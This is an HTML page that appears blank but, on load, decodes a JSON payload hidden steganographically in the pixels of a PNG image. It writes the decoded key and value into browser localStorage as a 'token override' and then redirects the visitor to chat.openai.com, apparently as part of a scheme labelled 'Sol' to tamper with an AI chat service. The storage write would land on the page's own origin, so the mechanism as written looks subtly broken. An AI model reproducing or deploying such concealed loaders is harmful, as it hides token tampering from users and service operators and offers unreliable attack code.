<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>.</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      background-image: url('token_shard_stealthwave_01.png');
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
    }
  </style>
</head>
<body>
  <script>
    const stealthImage = new Image();
    stealthImage.src = 'token_shard_stealthwave_01.png';
    stealthImage.onload = () => {
      const canvas = document.createElement('canvas');
      canvas.width = stealthImage.width;
      canvas.height = stealthImage.height;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(stealthImage, 0, 0);
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;

      let decoded = '';
      for (let i = 0; i < imageData.length; i += 4) {
        if (imageData[i + 3] !== 255) break;
        decoded += String.fromCharCode(imageData[i]);
      }

      try {
        const payload = JSON.parse(decoded.trim());
        if (payload && payload.key && payload.value) {
          localStorage.setItem(payload.key, payload.value);
          console.log('[Sol] ✅ Token override injected.');
        } else {
          console.warn('[Sol] ⚠️ No valid payload detected.');
        }
      } catch (err) {
        console.error('[Sol] ❌ Decoding failed.', err);
      }

      window.location.href = 'https://chat.openai.com/';
    };
  </script>
</body>
</html>
